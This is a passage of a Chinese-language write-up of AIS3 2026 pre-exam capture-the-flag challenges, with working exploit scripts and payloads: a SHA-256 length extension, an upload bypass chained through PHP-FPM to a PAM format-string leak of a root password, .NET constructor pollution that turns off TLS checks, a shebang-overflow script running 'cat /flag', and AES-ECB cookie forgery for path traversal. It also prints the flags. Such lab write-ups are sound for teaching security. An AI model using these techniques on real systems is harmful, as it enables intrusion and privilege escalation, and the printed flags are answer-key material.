1. 先取得原始 digest 的 proof。
2. 從 bit 254 開始，每次翻轉一個 pair 的第一個 bit。
3. 比較翻轉前後 proof。
4. 利用 `+5` 和 `x^5 mod N` 的逆運算，倒推出該 pair 的兩個 digest bits。
5. 重複 127 次即可恢復後 254 bits。
6. 最前面的 2 bits 可由初始狀態 `value = 0` 直接推出。

這樣可以完整恢復 `digest = sha256(flag + oracle_suffix)`。

### SHA-256 length extension

正式模式要計算 `sha256(flag + chosen_nonce + challenge_server_suffix)`，而我們已經知道 `sha256(flag + oracle_suffix)`。

SHA-256 是 Merkle-Damgård 結構，因此可以做 length extension。只要在 challenge 中送出：

```text
nonce = base64(oracle_suffix + sha256_padding(len(flag) + len(oracle_suffix)))
```

challenge 實際 hash 的內容就會變成：

```text
flag || oracle_suffix || padding || challenge_server_suffix
```

這樣就能從已知 digest 往後接著算。

Flag 長度未知，但可以用 oracle 測試不同長度。實測唯一符合的是 `62`。

### 最後流程

1. 進入 oracle。
2. nonce 輸入 `&s=5`，注入 prover seed。
3. 使用 bit flip oracle 回收 `sha256(flag + oracle_suffix)`。
4. Brute force flag 長度，找到 `62`。
5. 進入 challenge。
6. 每輪收到 server suffix 和 seed 後：
   - 用 length extension 算出該輪 digest。
   - 用 challenge 給的 seed 計算 proof。
7. 通過 16 輪後取得 flag。

### Flag

```text
AIS3{simple_oracle_and_dramatic_injections_leading_forge_XDDD}
```

---

## Lua Opcode Shuffling

### 思路

主 chunk 會建立多個 closure，並把它們分別當成不同用途的 helper：

```lua
gcd_like_or_mix = sub0
transform       = sub1
interleave      = sub2
make_key        = sub3
make_target     = sub4
check           = sub5
```

Checker 會先建立 key table 和 target table，再用 rolling state 檢查輸入。因為只要上一輪 state 已知，每個 byte 都能獨立反推，所以可以從前往後恢復 flag。

### 關鍵資料

Checker 先產生 key：

```lua
key = transform(
  interleave(
    {83, 102, 79, 57, 207, 142},
    {140, 252, 144, 116, 68}
  ),
  51, 9, 17
)
```

再產生 target：

```lua
target = transform(
  interleave(
    {186, 199, 186, 148, 16, 111, 106, 113, 66, 185, 41, 97, 192, 105, 232, 127, 67},
    {74, 49, 254, 98, 21, 85, 158, 184, 93, 177, 102, 248, 33, 39, 30, 30}
  ),
  17, 11, 23
)
```

`transform` 等價於：

```py
out[i] = (value[i] - a - ((i * b) % c)) % 256
```

最後 checker 要求輸入長度等於 target 長度，並用 rolling state 檢查：

```py
state = 65
for i in range(1, len(target) + 1):
    k = key[((i * 5 + state) % len(key))]
    side = bxor(k, i) % 13
    value = (bxor((input_byte + i + state) % 256, (k + i * 7) % 256) + side) % 256
    assert value == target[i]
    state = (state + value + k + i * 3) % 256

assert state == 229
```

因為每一輪的 `expected = target[i]` 已知，`state` 也可以從前一輪更新得到，所以能直接反推該輪 input byte。

### Solver

```python
def bxor(a, b):
    out = 0
    bit = 1
    while a > 0 or b > 0:
        if (a % 2) != (b % 2):
            out += bit
        a //= 2
        b //= 2
        bit *= 2
    return out


def transform(values, a, b, c):
    return [(x - a - ((i * b) % c)) % 256 for i, x in enumerate(values, 1)]


def interleave(left, right):
    out = []
    li = 0
    ri = 0
    for i in range(1, len(left) + len(right) + 1):
        if i % 2 == 1:
            out.append(left[li])
            li += 1
        else:
            out.append(right[ri])
            ri += 1
    return out


key = transform(
    interleave(
        [83, 102, 79, 57, 207, 142],
        [140, 252, 144, 116, 68],
    ),
    51,
    9,
    17,
)

target = transform(
    interleave(
        [186, 199, 186, 148, 16, 111, 106, 113, 66, 185, 41, 97, 192, 105, 232, 127, 67],
        [74, 49, 254, 98, 21, 85, 158, 184, 93, 177, 102, 248, 33, 39, 30, 30],
    ),
    17,
    11,
    23,
)

state = 65
flag = []

for i, expected in enumerate(target, 1):
    k = key[((i * 5 + state) % len(key))]
    side = bxor(k, i) % 13
    mixed = (expected - side) % 256
    byte_plus_state = bxor(mixed, (k + i * 7) % 256)
    byte = (byte_plus_state - i - state) % 256
    flag.append(byte)
    state = (state + expected + k + i * 3) % 256

assert state == 229
print(bytes(flag).decode())
```

### Flag

```text
AIS3{Lu4_0pc0d3_Shuffl1ng_1s_Fun}
```

---

## ƐSI∀ Sǝɔɹǝʇ Ⅎlɐƃ Sɥod

### 思路

這題一開始不是直接進到 flag shop。預設頁面幾乎只有原始碼顯示，最明顯的東西是 `highlight_file(FILE)`。所以前面其實是在亂翻常見位置：source、路徑、設定檔、奇怪檔名都看一下，但預設 host 沒看到真正的功能。後來想到可以查 TLS certificate，因為憑證的 SAN 會寫這張憑證可以用在哪些 domain。

憑證裡看到這個 domain：

```text
definitely-not-a-scam-website-trust-me-bro.iancmd.dev
```

用這個 domain 當 SNI / Host 之後，才會進到真正的 hidden vhost。畫面會變成一個 CTFd 風格的頁面，標題是 `AIS3 2026 pre-exam secret flag shop`，頁面上有兩個卡片：

```text
購買點數 100
找出 Flag 500
```

也就是說，入口不是預設 host，而是藏在 TLS certificate 裡的 vhost。

### 後面的路線

進到 fake flag shop 後，重點變成 receipt upload。`challenges.php` 看起來會擋 `.php` 和 `<?php`，但它只做 redirect，沒有 `exit` / `die`，所以後面還是會執行 `move_uploaded_file()`：

```php
if ($imageFileType == 'php') {
    http_response_code(420);
    header('Location: https://www.youtube.com/watch?v=vg6pnvn1u10');
}
if (strpos($file_content, '<?php') !== false) {
    http_response_code(420);
    header('Location: https://www.youtube.com/watch?v=tMPdR2-nhnw&t=395s');
}
move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
```

這邊的 bug 不是 filter 寫得多複雜，而是 redirect 後沒有停。檔案最後還是會進 `/uploads/`，而且可以被 Apache / PHP 執行。

不過直接在 PHP 5.6 裡跑 command 不行，因為 `system` 之類的 function 被禁掉了。接著翻設定時看到 `/phpMyAdmin` 會 proxy 到 PHP-FPM，而且 socket 權限很鬆：

```text
/run/php.sock
```

所以上傳的 PHP 5.6 檔案只拿來當 bridge，直接對 `/run/php.sock` 講 FastCGI，把真正要跑的 stage 丟到 `/tmp`，再指定：

```text
SCRIPT_FILENAME=/tmp/heph_stage.php
```

這樣 stage 會在 PHP 8.5 as `apache` 下跑，這邊 `system()` 可用，於是拿到 command execution。

但 `apache` 還是不能直接讀 `/flag`，因為權限是 `0600 root:root`，所以還要繼續找 root 的東西。

### PAM 那段

後面檢查 PAM 設定，看到 `/etc/pam.d/common-auth` 有載入一個 custom module：

```text
auth    [success=1 default=ignore]      pam_unix.so nullok
auth    sufficient                      pam_authlog.so
auth    requisite                       pam_deny.so
auth    required                        pam_permit.so
```

`pam_authlog.so` 的問題是會把 PAM username 當成 format string 寫進 log。用 local SSH authentication 觸發，username 放：

```text
S2.%2$.48s
```

就能讓 root `sshd` PAM process 把東西 leak 到 `/var/log/auth.log`。log 裡看到：

```text
S2.53r3C7-84CKD00r-P455W0rD\0
```

所以 root password 是 `53r3C7-84CKD00r-P455W0rD\0`。注意最後的 `\0` 是 literal 字串，不是 null byte。

最後用這組密碼登入 local root SSH，就能讀 `/flag`：

```text
X-Powered-By: PHP/8.5.4 Content-type: text/plain;charset=UTF-8
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
uid=0(root) gid=0(root) groups=0(root)
AIS3{h3r3_i5_7h3_f149_y0u_0rd3r3d_d86316d3c73f4918b89f396fe6d1ea4c} ret=0
```

### 完整鏈

```text
預設 host 只看到 highlight_file(FILE)
→ 亂翻常見位置，沒有直接入口
→ 查 TLS certificate SAN
→ 找到 definitely-not-a-scam-website-trust-me-bro.iancmd.dev
→ hidden vhost 進到 secret flag shop
→ upload redirect 後沒有 exit，PHP 仍被存進 /uploads/
→ PHP 5.6 command execution 被禁用
→ 用 /run/php.sock 打 PHP-FPM
→ PHP 8.5 stage 拿到 command execution
→ /flag 是 0600 root:root，apache 不能直接讀
→ PAM username format string leak root backdoor password
→ root SSH 登入讀 flag
```

### Flag

```text
AIS3{h3r3_i5_7h3_f149_y0u_0rd3r3d_d86316d3c73f4918b89f396fe6d1ea4c}
```

---

## Give Me Flag

### 思路

這題是一個 ASP.NET Core / .NET 8 web challenge。表面上首頁會要求輸入一個 Collector IP，然後伺服器會主動對該 IP 的 HTTPS `/api/flag` POST flag。

但直接架自簽 HTTPS server 會失敗，因為 .NET 的 outbound request 會驗證 TLS 憑證。真正關鍵在 `/Support` 的 component preview 功能：它可以透過 `Activator.CreateInstance` 建立指定型別，造成 constructor / static constructor pollution。

路線大概是：

```text
publish/GiveMeFlag.dll
→ IndexModel.OnPostAsync 驗證 IPAddress.TryParse
→ FlagDeliveryService 對 https://<ip>/api/flag POST flag
→ /Support?handler=Preview 可指定 component type
→ 觸發 ExchangeSystemUtility static constructor
→ 污染 ServicePointManager.ServerCertificateValidationCallback
→ 再提交自己的 VPN IP
→ 收到 flag POST
```

### 觀察

- 題目給的是 ASP.NET publish output，不是原始碼。
- 關鍵檔案是：

```text
publish/GiveMeFlag.dll
publish/Microsoft.Office.Server.Search.Connector.dll
docker-compose.yml
```

`docker-compose.yml` 裡可以看到預設設定：

```text
Challenge__Host: "flag-dropbox.givemeflag.internal"
Challenge__PostPath: "/api/flag"
Challenge__Port: "443"
```

反編譯 / 看 IL 後，首頁流程是：

```text
Input.TargetIp
→ IPAddress.TryParse
→ FlagDeliveryService.SendAsync
→ https://<TargetIp>/api/flag
→ Host: flag-dropbox.givemeflag.internal
→ body 裡放 flag
```

所以使用者只能控制 IP，不能直接控制 path、host 或 scheme。

### 做法

1. 先建立 instancer。

`http://chals1.ais3.org:30000/` 是 instancer 頁面，不是實際題目 app。用 CTFd token 建 instance 後，才會拿到真正 app port。

2. 分析首頁 outbound delivery。

首頁表單欄位是 `Input.TargetIp`，送出後 server 會對 `https://<Input.TargetIp>/api/flag` 發出 POST，且 HTTP Host header 固定是 `flag-dropbox.givemeflag.internal`。

如果直接填自己的 IP，會因為 HTTPS 憑證驗證失敗而顯示：

```text
Delivery failed
The outbound HTTPS request failed.
```

3. 分析 `/Support`。

`/Support` 有一個 component preview form，其中 `Preview.Template` 支援這種格式：

```text
status/network#<type name>
```

在 DLL 裡可以看到大致流程：

```text
PreviewComponentResolver.Create
→ ParseDescriptor
→ ResolveComponentType
→ Type.GetType(...)
→ Activator.CreateInstance(...)
→ ToString()
```

也就是說，只要找到有 public parameterless constructor 的型別，就能讓 server 建立它。

4. 找到有用的型別。

`Microsoft.Office.Server.Search.Connector.dll` 裡有一個重要型別：

```text
Microsoft.Office.Server.Search.Connector.BDC.Exchange.ExchangeSystemUtility, Microsoft.Office.Server.Search.Connector
```

這個型別初始化時會碰到 `System.Net.ServicePointManager.ServerCertificateValidationCallback`，觸發後會污染目前 process 的 TLS 憑證驗證行為。

先在 `/Support` preview 它，回應會顯示型別成功建立。

5. 架 HTTPS listener 接 flag。

在自己的 VPN IP 上開 `443`，使用自簽憑證即可。listener 收 `/api/flag`，回 200 即可。

6. 回首頁提交 Collector IP。

這次因為 TLS 驗證已被污染，server 成功送出：

```text
Flag submitted
POST https://<vpn-ip>/api/flag completed.
```

listener 收到的 request：

```text
POST /api/flag
Host: flag-dropbox.givemeflag.internal
Content-Type: application/json

{"flag":"AIS3{c_5h4rp_c0n57ruc70r_p0llu710n_...}","challenge":"GiveMeFlag","sent_at":"..."}
```

### 為什麼這題叫 Give Me Flag

因為首頁功能真的會「把 flag 給你」，只是有兩層限制：

- 只能填 IP，不能填任意 URL。
- outbound HTTPS 會驗證憑證，不能直接用自簽 listener 接。

真正解法不是繞 URL parser，而是先用 `/Support` 的 constructor pollution 改掉 process-wide TLS 驗證，再讓首頁功能把 flag POST 出來。

### Flag

```text
AIS3{c_5h4rp_c0n57ruc70r_p0llu710n_877f81c2db77402abf24f824f99e56c7}
```

---

## 想在雪中來杯下午茶嗎?

圖片牌子翻譯，豐鄉町車站附近的平交道，Google 街景一個一個路口看：

```text
https://www.google.com/maps/search/35.193489,+136.226829
```

### Flag

```text
AIS3{35.193-136.226}
```

---

## Jail

### 思路

題目直接在 `/` 回傳 Flask source code。`POST /<uuid>` 會把輸入寫成一個可執行 Python script，執行後回傳 stdout。

關鍵程式碼：

```py
shebang = '#!/usr/local/bin/python3'

d = unicodedata.normalize("NFKC", request.data.decode())
assert not any(i in d for i in "()_[]{}.@#")
open(f"data/{uid}","w").write(shebang + d)
os.chmod(f"data/{uid}", 0o755)
os.popen(f"./data/{uid} > ./output/{uid}")
```

過濾字元：

```text
()_[]{}.@#
```

### 觀察

`shebang` 後面沒有自動補 newline，所以 payload 會直接接在第一行：

```text
#!/usr/local/bin/python3<payload>
```

如果讓第一行變得太長，kernel 無法正常解析 shebang。因為程式是透過 shell 執行 `./data/<uid>`，當 exec 失敗時，shell 會把檔案當成 shell script 解讀。

第一行的 `#!...AAAA` 在 shell 裡是註解，下一行就可以直接執行 shell command。

### 做法

送出一段足夠長的字串撐爆 shebang line，接著換行執行 `cat /flag`。

```py
import uuid
import requests

url = "http://chals1.ais3.org:10001/"

uid = str(uuid.uuid4())
payload = b"A" * 240 + b"\ncat /flag\n"

r = requests.post(url + uid, data=payload, timeout=8)
print(r.text)
```

### Flag

```text
AIS3{5H3_BA_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_NG!}
```

---

## EasyWEB

### 思路

這題表面上是一個 Flask note app，外面還有 Cloudflare 和 invisible reCAPTCHA，所以一開始比較像是要從正常瀏覽器流程下手。送出 note 後，server 會把內容存在 `data/<name>.txt`，同時回一個 `session` cookie。後來確認這個 cookie 其實是「檔名」被 AES-ECB 加密後的 hex，而且只有加密，沒有 MAC 或其他完整性保護。

重點就變成 ECB 可以 cut-and-paste：只要先讓 server 幫我們加密想要的 plaintext block，再把不需要的 block 丟掉，就能偽造出會被解成 `../../app/app.py` 的 session cookie。這樣 app 會去讀自己的 source code，而 flag 就直接寫在 source 裡。

### 觀察

- note 名稱最後會變成檔名：`<name>.txt`。
- 成功建立 note 後，response 會設一個固定的 hex `session` cookie。
- 同一個 `name` 產生的 cookie 一樣，長字串也能看出重複 block，所以可以判斷是 ECB。
- cookie 解密後的結果會直接拿去 `os.path.join(DATA_DIR, filename)` 讀檔。
- 只檢查建立 note 時的 `name`，但讀 cookie 時沒有重新做路徑限制。

### 做法

1. 用正常瀏覽器進站，先通過 Cloudflare 和 invisible reCAPTCHA。
2. 送一筆正常 note，觀察 `session` cookie 是 deterministic 的 hex。
3. 用重複字元測試，確認 cookie block 有 ECB 特徵。
4. 把 note creation endpoint 當成 encryption oracle，讓它幫忙加密我們想要的路徑。
5. payload 的核心是讓第二個 block 開始剛好是目標檔名：

```py
target = b"../../app/app.py"
payload_name = b"A" * 16 + target + bytes([16]) * 16
```

6. server 後面會自動加 `.txt`，但因為 ECB 可以直接切 block，所以我們只取中間對應 `../../app/app.py + padding` 的 ciphertext block。
7. 把取出的 block 組成 forged `session` cookie。
8. 帶 forged cookie 重新 GET `/`，server 解密後會讀 `data/../../app/app.py`。
9. source code 被 render 出來後，直接看到 flag。

### 關鍵原始碼

cookie 只做 AES-ECB 加密，沒有完整性保護：

```py
def lock(value):
    return AES.new(KEY, AES.MODE_ECB).encrypt(pad(value.encode())).hex()

def unlock(value):
    raw = bytes.fromhex(value)
    return unpad(AES.new(KEY, AES.MODE_ECB).decrypt(raw)).decode()
```

讀 note 時直接把解出的 `filename` 接到 `DATA_DIR` 後開檔：

```py
filename = unlock(saved)
with open(os.path.join(DATA_DIR, filename), "r", encoding="utf-8") as f:
    note = f.read()
```

建立 note 時雖然有檢查開頭不能是 `.` 或 `/`，但 forged cookie 的讀檔路徑不會再經過這個檢查。

### Flag

```text
AIS3{copy_and_paste_the_flag}
```

---

## tetris，簡單

### 思路

這題是一個 Linux terminal Tetris 遊戲。雖然題目說「幫玩俄羅斯方塊」，但其實不用真的玩到某個分數。Flag 被加密藏在 binary 裡，程式內有一段隱藏流程會：

```text
讀取固定 Tetris pattern
→ 產生 key
→ 複製 encrypted flag
→ 用 RC4-like 演算法解密
→ 印出 flag
```

所以重點是 reverse 出這段解密流程。

### 觀察

解壓縮後只有一個檔案 `tetris`，格式是：

```text
ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

直接執行會看到 Tetris 畫面：

```text
TETRIS - Score: 0 | Lines: 0
Controls: WASD/Arrows, Q=Rotate, ESC=Quit
```

`strings` 沒有直接出現完整 flag，只能看到一些遊戲字串。

### 做法

1. 先找遊戲字串的 xref，定位主要遊戲邏輯附近。

2. 反組譯時會看到大量這種混淆：

```asm
eb ff
```

這會干擾線性反組譯。實際執行時會跳到 `eb ff` 的第二個 byte，讓後面變成正常指令，例如 `ff c0` 會被解成 `inc eax`。

為了方便分析，可以複製一份 binary，把所有 `EB FF` 的 `EB` patch 成 `NOP`。

3. 去混淆後，可以看到一段可疑流程：

```text
0x17371e0 讀出 4x10 的 pattern matrix
→ 用 FNV-like hash 算出 state
→ 產生 24 bytes key
→ 從 0x1aa6130 複製 28 bytes ciphertext
→ 呼叫 RC4-like 函式解密
```

4. 重寫解密邏輯後即可得到 flag。

5. 最後用 gdb 直接呼叫原程式的初始化與解密函式驗證：

```gdb
p ((void(*)(void))0x15c30b5)()
p ((void(*)(char*,int,char*,int))0x15c1c61)((char*)0x1aa8a60,28,(char*)0x1aa8a40,24)
x/s 0x1aa8a60
```

### 總結

這題表面上是 Tetris 遊戲，但真正的 flag 不需要靠遊玩取得。核心在於：

1. 找到遊戲邏輯附近的隱藏輸出流程。
2. 處理 `EB FF` 反組譯混淆。
3. 還原 pattern hash 產生 key 的方式。
4. 還原 RC4-like 解密流程。
5. 解出 encrypted flag。

### Flag

```text
AIS3{T3tr1s_P4tt3rn_M4st3r!}
```
